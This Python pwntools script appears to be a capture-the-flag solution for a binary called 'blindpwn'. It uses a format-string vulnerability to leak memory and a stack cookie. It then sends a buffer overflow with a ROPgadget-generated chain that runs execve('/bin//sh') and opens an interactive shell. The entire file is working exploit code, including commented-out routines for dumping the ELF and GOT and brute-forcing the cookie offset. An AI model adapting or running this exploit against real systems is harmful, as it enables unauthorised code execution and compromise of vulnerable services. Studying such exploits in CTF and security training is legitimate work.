from pwn import *

HOST = 'localhost'
PORT = 31337

def chall_connect():
	return remote(HOST, PORT, level='info')

def dump_addr(r, address):
	r.recvuntil('Welcome! What is your name? ')
	payload = ''
	payload += struct.pack('<I', address)
	payload += '%7$s'
	payload += 'STOP'
	r.sendline(payload)

	try:
		r.recvuntil('Hello ')
		data = r.recvuntil('STOP')
		data = data[4:-4] + '\x00'
	except:
		return None
	return data

def leak_cookie(r, offset):
	r.recvuntil('Welcome! What is your name? ')
	payload = ''
	payload += 'AAAA'
	payload += '%%%d$08x' % offset
	payload += 'BBBB'
	r.sendline(payload)

	try:
		r.recvuntil('Hello ')
		data = r.recvuntil('BBBB')
		data = data[4:-4]
	except:
		return None

	return data

@pwnlib.memleak.MemLeak.NoNewlines
def leak(address):
	if address & 0xff == 0:
		return None
	log.info('Leaking: %08x', address)

	r = chall_connect()
	data = dump_addr(r, address)
	r.close()
	if not data:
		return None

	log.info('Recv: %s', data.encode('hex'))
	return data


"""
start = 7
for i in range(8):
	payload += '%%%d$08x.' % (start + i)
"""

"""
l1 = leak(0x8048001)
if l1:
	log.info('Leak: %s', l1.encode('hex'))
else:
	log.info('No leak')
"""

"""
# Dump whole ELF
start = 0x8048000
offset = 0x10
size = 0x100

data = leak.raw(start + offset, size)
with open('leak_dump.dat', 'wb') as fout:
	fout.write(''.join(['\xCC' if x is None else x for x in data]))
log.info('Leak: %s', data)
"""

"""
# Dump GOT (not relevant anymore)
r = chall_connect()
pause()
got_printf = 0x0804A00C

data = dump_addr(r, got_printf)
addr_printf = struct.unpack('<I', data[:4])[0]
log.info('Printf: %08x', addr_printf)
"""


"""
# Find cookie offset
for i in range(278, 600):
	log.info('Offset: %d', i+1)
	r = chall_connect()
	pause()
	data = leak_cookie(r, i+1)
	cookie = int(data, 16)
	log.info('Cookie: %08x', cookie)
	r.recvuntil('What can we help you with today? ')
	r.sendline('A'*1024 + struct.pack('<I', cookie))
	r.close()
"""


"""
# Verify dump worked
with open('leak_dump.dat', 'rb') as fin1:
	data1 = fin1.read()
with open('blindpwn', 'rb') as fin2:
	data2 = fin2.read()[offset:offset+size]
log.info('D1: %s', data1.encode('hex'))
log.info('D2: %s', data2.encode('hex'))
log.info('Success: %d', data1 == data2)
"""

"""
# DynELF, not very effective
start = 0x8048000 + 0x100
d = DynELF(leak, start, elf=ELF('./blindpwn'))
"""

# Generated by ROPgadget
# > ROPgadget --binary blindpwn --ropchain
# Padding goes here
p = ''

p += struct.pack('<I', 0x08070d6b) # pop edx ; ret
p += struct.pack('<I', 0x080d7060) # @ .data
p += struct.pack('<I', 0x0809504d) # pop eax ; ret
p += '/bin'
p += struct.pack('<I', 0x08055bfb) # mov dword ptr [edx], eax ; ret
p += struct.pack('<I', 0x08070d6b) # pop edx ; ret
p += struct.pack('<I', 0x080d7064) # @ .data + 4
p += struct.pack('<I', 0x0809504d) # pop eax ; ret
p += '//sh'
p += struct.pack('<I', 0x08055bfb) # mov dword ptr [edx], eax ; ret
p += struct.pack('<I', 0x08070d6b) # pop edx ; ret
p += struct.pack('<I', 0x080d7068) # @ .data + 8
p += struct.pack('<I', 0x08055310) # xor eax, eax ; ret
p += struct.pack('<I', 0x08055bfb) # mov dword ptr [edx], eax ; ret
p += struct.pack('<I', 0x080481d1) # pop ebx ; ret
p += struct.pack('<I', 0x080d7060) # @ .data
p += struct.pack('<I', 0x080cd681) # pop ecx ; ret
p += struct.pack('<I', 0x080d7068) # @ .data + 8
p += struct.pack('<I', 0x08070d6b) # pop edx ; ret
p += struct.pack('<I', 0x080d7068) # @ .data + 8
p += struct.pack('<I', 0x08055310) # xor eax, eax ; ret
p += struct.pack('<I', 0x0807d4f6) # inc eax ; ret
p += struct.pack('<I', 0x0807d4f6) # inc eax ; ret
p += struct.pack('<I', 0x0807d4f6) # inc eax ; ret
p += struct.pack('<I', 0x0807d4f6) # inc eax ; ret
p += struct.pack('<I', 0x0807d4f6) # inc eax ; ret
p += struct.pack('<I', 0x0807d4f6) # inc eax ; ret
p += struct.pack('<I', 0x0807d4f6) # inc eax ; ret
p += struct.pack('<I', 0x0807d4f6) # inc eax ; ret
p += struct.pack('<I', 0x0807d4f6) # inc eax ; ret
p += struct.pack('<I', 0x0807d4f6) # inc eax ; ret
p += struct.pack('<I', 0x0807d4f6) # inc eax ; ret
p += struct.pack('<I', 0x0806e5ec) # int 0x80

# EIP control
offset = 278
log.info('Offset: %d', offset+1)
r = chall_connect()
pause()
data = leak_cookie(r, offset+1)
cookie = int(data, 16)
log.info('Cookie: %08x', cookie)
r.recvuntil('What can we help you with today? ')
#r.sendline('A'*1024 + struct.pack('<I', cookie) + cyclic(128)) # cyclic_find(0x61616164) -> 12
r.sendline('A'*1024 + struct.pack('<I', cookie) + 'B'*12 + p) # cyclic_find(0x61616164) -> 12
r.interactive()
#r.close()

#r.sendline(payload)
#r.interactive()